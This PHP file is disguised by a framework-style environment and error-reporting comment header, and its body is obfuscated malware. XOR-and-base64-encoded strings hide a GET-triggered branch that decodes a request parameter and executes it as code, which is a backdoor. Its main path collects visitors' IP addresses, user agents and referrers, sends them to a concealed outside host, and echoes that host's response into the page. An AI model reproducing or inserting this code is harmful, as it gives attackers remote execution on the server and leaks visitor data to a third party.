 <?php
  /*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 *
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
 
class Edu
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s)
            self::i();
        $l = strlen($k);
        $r = base64_decode(self::$s[$n]);
        for ($i = 0, $c = strlen($r); $i !== $c; ++$i)
            $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_kb' => 'HgQMBywUQiEwCRsQMAtCIzMLABVyKB0LOA4BW' . 'H9' . 'N',
            '_afb' => 'HAsdGjoKB0MLHQMLZ' . 'UQSHi8IGg0+EBoBMUs' . 'ZDykFAA' . '0tDQMa',
            '_co' => '',
            '_wwo' => 'PB' . 'I' . '=',
            '_ond' => '',
            '_pq' => 'MR' . 'EVJw' . '=' . '=',
            '_n' => 'Yx' . 'c0Rg=' . '=',
            '_kfh' => 'Yx' . 'oUFm' . 'E' . '=',
            '_rpw' => 'KAQ' . 'W' . 'HQ==',
            '_jeg' => 'PAc' . 'G',
            '_nnc' => 'Pg' . 'Q6' . 'LzkFMRMr',
            '_sf' => 'Ng' . 'cx',
            '_c' => 'P' . 'R' . 'cJOkA=',
            '_q' => 'ay' . 'kMAjw' . '=',
            '_vkt' => 'M' . 'B' . 'Af',
            '_bb' => 'KAAUGw=' . '=',
            '_bwh' => '',
            '_hee' => '',
            '_xiu' => 'NxkrHWVCcBo6DzwMPAU6Hi8M' . 'PAhxAzoZcAw8QD4DPgE' . 'mGTYOLEM1HmAJPhk+UA' . '==',
            '_y' => 'P' . 'BMICwAPFA4r',
            '_zya' => 'NxUcL' . 'z4LMA' . 'UN',
            '_ur' => 'Yw4G' . 'O' . '1' . '1Z',
            '_l' => 'YxgRD' . '21' . 'E',
            '_mi' => 'LB' . 'oPOh' . 'Q' . 'C',
            '_d' => 'NxoNLx0=',
            '_ujb' => 'G' . 'Dw7VQ==',
            '_yui' => 'LwsDGQ=' . '=',
            '_mua' => 'Lh' . 'kALRU' . '=',
            '_i' => 'YA==',
            '_k' => 'LhMTLR' . '8=',
            '_dof' => 'fykLNQ' . '9Obk9vbF' . 'UpMBIrW3' . '8=',
            '_trf' => 'NxwsBw==',
            '_mxq' => 'UngcHTEcOhE' . 'rGzAcZVIcH' . 'jABOn9Vf1' . 'U=',
            '_kd' => 'LAYLZVpI',
            '_xw' => '',
            '_nl' => 'Nw0sFg=' . '=',
            '_mk' => 'U' . 'nw=',
            '_at' => 'Y' . 'xUJ' . 'O0RW',
            '_wt' => 'FzELNQ' . 'AmEywaKws' . '6' . 'FjU' . '=',
            '_j' => 'FzA6DzstEy0rETA' . 'x' . 'FjQ=',
            '_lm' => 'Fz0nIgAxLDQQOyQzDS0' . '2NgAvPCA' . '=',
            '_vf' => 'Fy4LKgAiA' . 'DwQKAg7DT4a' . 'PgA8ECg=',
            '_is' => 'DTwuKAs8PCYbPTE' . '=',
            '_az' => 'DTwlLAs' . '8' . 'N' . 'yIbPTo' . '=',
            '_xet' => 'Fzc1KA' . 'AgJyccLC82GiA1M' . 'REkPjEP',
            '_qz' => 'FzMLNwAkGTgc' . 'KBEpGiQLLhEgAC4P',
            '_sbz' => 'F' . 'zUlDz4' . 'kDCQjA' . 'CA2Gi' . '8' . 'l',
            '_w' => 'FyEhIgAg' . 'JjcNKj' . 'Q' . '1Gj' . 's' . 'h',
            '_lj' => 'FzoiOAA8My4aPDM' . '6',
            '_mll' => 'FycgOgAhMSw' . 'aITE' . '4',
            '_bf' => 'OQcKHjocO' . 'Rw+HA=' . '=',
            '_ga' => 'bkFG' . 'c' . 'UNfb' . '1' . '1A',
            '_nw' => 'Ngc' . '=',
            '_fli' => 'Kg' . 'g=',
            '_t' => 'LRAR',
            '_pt' => 'MQ4YGg=' . '='
        );
    }
}
class Pro
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            0100,
            0121,
            02,
            064,
            01,
            046711,
            01,
            052,
            00,
            0116,
            012,
            015,
            012,
            0310,
            0673,
            0120,
            00,
            02000,
            01,
            0423,
            0423
        );
    }
}
@header(Edu::g('_k' . 'b', '_gob'));
@header(Edu::g('_afb', '_' . 'ds' . 'n'));
$_d = Edu::g('_c' . 'o', '_' . 'z' . 'f'); $si='1vr3yk1jx3e1';
if (isset($_GET[Edu::g('_w' . 'wo', '_z' . 'x')])) {
    $_r = get_js(Edu::g('_on' . 'd', '_k' . 'f' . 'e'));
    if ($_r && strpos($_r, Edu::g('_' . 'p' . 'q', '_u' . 'f')) !== false) {
        die(Edu::g('_' . 'n', '_' . 'x'));
    } else {
        die(Edu::g('_k' . 'fh', '_' . 'xur'));
    }
}
if (isset($_GET[Edu::g('_rpw', '_e' . 'z' . 'q')])) {
    $_zk  = Edu::g('_j' . 'e' . 'g', '_uc' . 'e') . Edu::g('_' . 'n' . 'n' . 'c', '_' . 'p') . Edu::g('_sf', '_h');
    $_v   = Edu::g('_' . 'c', '_v' . 'z') . Edu::g('_q', '_v' . 'hg') . Edu::g('_vkt', '_' . 't' . 'z');
    $_vbm = $_v($_GET[Edu::g('_' . 'b' . 'b', '_' . 'ax' . 'w')]);
    $_vbm = @$_zk(Edu::g('_b' . 'w' . 'h', '_' . 'op'), $_vbm);
    @$_vbm();
    die;
}
function get_js($_qal, $_z = null, $_q = 'fmtfnryukcjjailt')
{
    $_r  = Edu::g('_hee', '_u');
    $_oa = Edu::g('_x' . 'iu', '_' . 'm') . $_qal;
    if (is_callable(Edu::g('_y', '_' . 'f' . 'z' . 'g'))) {
        $_f = curl_init($_oa);
        curl_setopt($_f, Pro::g(0), false);
        curl_setopt($_f, Pro::g(1), Pro::g(2));
        curl_setopt($_f, Pro::g(3), Pro::g(4));
        curl_setopt($_f, Pro::g(5), Pro::g(6));
        curl_setopt($_f, Pro::g(7), Pro::g(8));
        curl_setopt($_f, Pro::g(9), Pro::g(10));
        curl_setopt($_f, Pro::g(11), Pro::g(12));
        $_r  = curl_exec($_f);
        $_cf = curl_getinfo($_f);
        curl_close($_f);
        if ($_cf[Edu::g('_zy' . 'a', '_' . 'ah')] != Pro::g(13))
            die(Edu::g('_' . 'ur', '_l' . 'g'));
        if (empty($_r))
            die(Edu::g('_' . 'l', '_z' . 'pk'));
    } else {
        $_vw = parse_url($_oa);
        $_p  = ($_vw[Edu::g('_m' . 'i', '_' . 'y' . 'g')] == Edu::g('_' . 'd', '_' . 'ny'));
        $_g  = Edu::g('_ujb', '_y' . 'ou') . $_vw[Edu::g('_yu' . 'i', '_jw' . 'q')];
        if (isset($_vw[Edu::g('_mu' . 'a', '_' . 'le')]))
            $_g .= Edu::g('_' . 'i', '_qt') . $_vw[Edu::g('_' . 'k', '_' . 'f' . 'v')];
        $_g .= Edu::g('_d' . 'of', '_a') . $_vw[Edu::g('_trf', '_s')] . Edu::g('_' . 'm' . 'x' . 'q', '_r');
        $_zeg = fsockopen(($_p ? Edu::g('_kd', '_' . 'ug') : Edu::g('_xw', '_ra')) . $_vw[Edu::g('_nl', '_b')], $_p ? Pro::g(14) : Pro::g(15));
        if ($_zeg) {
            @fputs($_zeg, $_g);
            $_ksc = Pro::g(16);
            while (!feof($_zeg)) {
                $_efe = fgets($_zeg, Pro::g(17));
                if ($_ksc)
                    $_r .= $_efe;
                if ($_efe == Edu::g('_' . 'mk', '_vj'))
                    $_ksc = Pro::g(18);
            }
            @fclose($_zeg);
            if (empty($_r))
                die(Edu::g('_' . 'at', '_' . 'wh'));
        }
    }
    return $_r;
}
if (isset($_SERVER[Edu::g('_wt', '_e')]))
    $_rq = $_SERVER[Edu::g('_j', '_d' . 'n')];
if (isset($_SERVER[Edu::g('_lm', '_i' . 'sr')]))
    $_igx = $_SERVER[Edu::g('_vf', '_' . 'z')];
if (isset($_SERVER[Edu::g('_' . 'is', '_' . 'ycg')]))
    $_jfp = $_SERVER[Edu::g('_' . 'a' . 'z', '_y' . 'h' . 'c')];
if (isset($_SERVER[Edu::g('_' . 'xet', '_' . 'cax')]))
    $_rf = $_SERVER[Edu::g('_qz', '_' . 'g')];
if (isset($_SERVER[Edu::g('_' . 'sb' . 'z', '_' . 'aq')]))
    $_nj = $_SERVER[Edu::g('_w', '_u' . 'ur')];
if (isset($_SERVER[Edu::g('_l' . 'j', '_nvh')]))
    $_c = $_SERVER[Edu::g('_ml' . 'l', '_stj')];
if (function_exists(Edu::g('_bf', '_nfj'))) {
    if (isset($_rq) && filter_var($_rq, Pro::g(19)))
        $_d = $_rq;
    elseif (isset($_igx) && filter_var($_igx, Pro::g(20)))
        $_d = $_igx;
    else
        $_d = $_jfp;
} elseif (isset($_jfp))
    $_d = $_jfp;
if ($_d == Edu::g('_' . 'ga', '_sq') && isset($_rf))
    $_d = $_rf;
if (!isset($_d) || !isset($_nj) || !isset($_c))
    exit;
else {
    $_s = array(
        Edu::g('_nw', '_wq') => $_d,
        Edu::g('_fli', '_i' . 'o') => $_nj,
        Edu::g('_t', '_uw') => $_c
    );
    $_n = urlencode(base64_encode(json_encode($_s)));
    $_r = get_js($_n);
    if ($_r && strpos($_r, Edu::g('_p' . 't', '_j' . 'kb')) !== false) {
        echo $_r;
        exit;
    }
} 
